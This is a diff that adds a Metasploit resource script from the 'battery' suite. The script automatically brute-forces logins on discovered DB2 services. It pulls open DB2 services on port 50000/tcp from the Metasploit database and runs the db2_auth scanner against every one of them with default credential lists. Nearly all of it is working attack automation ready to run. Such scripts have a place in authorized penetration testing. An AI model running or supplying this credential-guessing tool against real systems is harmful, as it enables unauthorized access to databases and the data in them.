@@ -1,0 +1,58 @@
+<ruby>
+=begin
+  Name:  battery/db2_login.rc
+    This script is intended to be used with the Metasploit Framework as a part of the battery suite of resource scripts
+    For more information see:
+      Battery Resource Scripts: https://github.com/kn0/battery
+      Metasploit Framework:  https://github.com/rapid7/metasploit-framework
+
+  Author: kn0
+    twitter: @TrentonIvey
+    email: "Trenton.Ivey@example.com".gsub(/example/,'gmail')
+    web: kn0.ninja
+
+  Description:
+    This Metasploit RC-File attempts to authenticate to discovered DB2 services using Metasploit's default db2 credential lists.
+    It does so by using auxiliary/scanner/db2/db2_auth against all discovered DB2 services
+    Targets are chosen by matching service names with 'db2' and ports of 50000/tcp
+
+=end
+# Print Header
+print_status "Using auxiliary/scanner/db2/db2_auth"
+  
+# Get a list of target services
+targets = []
+begin
+  framework.db.services.each do |service|
+    if ( (service.name =~ /db2/i or service.port.eql? 50000) and service.state.eql? 'open' and service.proto.eql? 'tcp')
+      targets << {'ip' => service.host.address, 'port' => service.port}
+    end
+  end
+  # Remove any duplicate entries
+  targets.uniq!
+rescue ActiveRecord::ConnectionNotEstablished
+  puts "DB not connected..."
+  return
+end
+
+if targets.empty?
+  print_warning "No targets found"
+else
+  # Get a lits of unique target ports
+  target_ports = (targets.map {|t| t['port'] }).uniq
+
+  # Setup the module
+  self.run_single("use auxiliary/scanner/db2/db2_auth")
+  self.run_single("set ShowProgress false")
+  self.run_single("set VERBOSE true")
+  
+  # Run the module once for each discovered target port (with the associated hosts)
+  target_ports.each do |target_port|
+    self.run_single("set RPORT #{target_port}")
+    target_rhosts = ((targets.select {|t| t['port'].eql? target_port}).map {|t| t['ip'] }).join (" ")
+    self.run_single("set RHOSTS #{target_rhosts}")
+
+    self.run_single("run")
+  end
+end
+</ruby>
